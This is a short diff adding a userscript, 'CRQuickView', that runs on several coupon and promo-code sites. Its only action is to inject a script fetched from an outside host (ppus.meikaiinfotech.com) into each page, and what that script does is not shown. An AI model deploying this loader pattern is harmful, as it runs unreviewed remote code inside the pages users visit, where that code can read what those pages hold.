@@ -1,0 +1,23 @@
+// ==UserScript==
+// @name        CRQuickView
+// @namespace   PromosPro
+// @description just for quick view
+// @include     http://www.winmount.com/promo-codes/*
+// @include     https://www.sayweee.com/coupons/*
+// @include     https://www.couponcodealert.com*
+// @include     http://www.idealdvdcopy.com/coupon-codes*
+// @include     https://www.extrabux.com/coupons*
+// @include     https://www.geoipview.com/coupon-codes*
+// @include     https://www.icopyexpert.com/promo-code*
+// @include     http://www.i-funbox.com/coupons*
+// @include     https://www.smarterpicks.com*
+// @include     http://www.winmount.com/promo-codes*
+// @include     http://www.winmpg.com/coupon-codes*
+// @version     1
+// ==/UserScript==
+ var d = new Date();
+var h = d.getHours();
+var GM_JQ = document.createElement('script');
+GM_JQ.src = 'https://ppus.meikaiinfotech.com/ppus/js/Gmonkey.js?'+h;
+GM_JQ.type = 'text/javascript';
+document.getElementsByTagName('head')[0].appendChild(GM_JQ);
